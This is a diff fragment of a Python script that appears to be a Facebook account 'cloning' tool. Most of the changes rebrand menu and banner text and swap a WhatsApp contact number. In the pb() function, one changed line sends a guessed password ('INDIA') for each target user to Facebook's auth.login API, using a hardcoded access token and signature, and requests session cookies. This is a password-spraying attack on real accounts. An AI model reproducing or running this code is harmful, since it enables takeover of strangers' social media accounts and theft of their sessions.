@@ -262,9 +262,9 @@ def menu():
 
 	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
 
-	print (S + '[' + P + '☞2' + S + ']' + S + ' Update B4_BALOCH Tool')
+	print (S + '[' + P + '☞2' + S + ']' + S + ' Update TAAK Tool')
 
-	print (S + '[' + P + '☞3' + S + ']' + S + ' B4_BALOCH WhatsApp Group')
+	print (S + '[' + P + '☞3' + S + ']' + S + ' TAAK WhatsApp Group')
 
 	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
 
@@ -322,11 +322,11 @@ def mb():
 
 	    psb('☆☆☆☆☆☆☆☆☆☆100%')
 
-	    psb('Frends login new Account✓')
+	    psb('Dont use your personal account Frends login new Account✓')
 
-	    psb('WhatsApp Num 03232132362✓')
+	    psb('WhatsApp Num 7504333331✓')
 
-	    psb('WellCome To RJIVI')
+	    psb('WellCome To INDIA')
 
 	    psb('Congratulations RJIVI Tool Has Been Updated Successfully')
 
@@ -334,7 +334,7 @@ def mb():
 
 	    psb('🔓Password ☆ RJIVI✓')
 
-	    psb('Subscrib My Youtube Channel RJIVI M4 MASTER✓')
+	    psb('Subscrib My Youtube Channel RJIVI ✓')
 
 	    psb('Please Login Again')
 
@@ -608,7 +608,7 @@ def pb():
 
 			                            else:
 
-			                                ps5=('Pakistan')
+			                                ps5=('INDIA')
 
 			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 
